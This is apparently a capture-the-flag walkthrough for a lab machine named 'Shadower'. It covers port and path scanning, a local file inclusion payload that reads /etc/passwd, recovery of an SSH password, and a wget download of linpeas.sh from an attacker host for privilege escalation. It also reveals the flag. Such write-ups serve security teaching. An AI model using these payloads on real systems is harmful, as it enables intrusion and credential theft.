# Shadower

> **Challenge:** Get the highest privilege on the target machine and retrieve the flag.

---

## Walkthrough

### 1. Initial Enumeration

Begin with a scan of the target's TCP ports:

```bash
nmap <ip> -T5 -p-
```

The scan reveals two open ports:

| Port | Service |
|:--|:--|
| `22` | SSH |
| `80` | HTTP |

Visiting `/index.html` displays the default Apache page, so the next step is to enumerate other web paths.

```bash
ffuf -u http://<ip>/FUZZ -w /usr/share/wordlist/dirb/common.txt
```

The scan identifies `/index.php`.

### 2. Local File Inclusion

Further exploration reveals a **Local File Inclusion (LFI)** issue through the `view` parameter:

```text
/index.php/?view=
```

Testing a path to the local password database returns its contents:

```text
/index.php/?view=../../../etc/passwd
```

The output exposes system account names, including `john`, but not the password required to log in.

### 3. Finding the Credentials

Inspecting the contact page reveals a comment referencing the file:

```text
my0wns3cr3t.sec
```

Reading that file reveals a value encoded through multiple layers of Base64. After decoding it, the recovered password is:

```text
B100dyPa$$w0rd
```

With the username and password identified, connect to the target using SSH:

```bash
ssh john@<ip>
```

### 4. Privilege Escalation

After obtaining a shell, use `linpeas.sh` to check the system for potential privilege-escalation paths.

Start a web server on the local machine to serve the script:

```bash
python -m http.server 80
```

Download it from the target:

```bash
wget http://<attacker_ip>/linpeas.sh
```

Make the script executable and run it:

```bash
chmod +x linpeas.sh
```

The enumeration points to permissions on `/etc/passwd`. This leads to a privilege-escalation approach involving a writable password file and an account entry containing a hashed password.

The technique is described in the [writable `/etc/passwd` privilege-escalation reference](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#writable-etcpasswd).

## 🚩 Flag

<details>
<summary><strong>Reveal Flag</strong></summary>

```text
6199b2f763edf25c1f161b275375c100
```

</details>
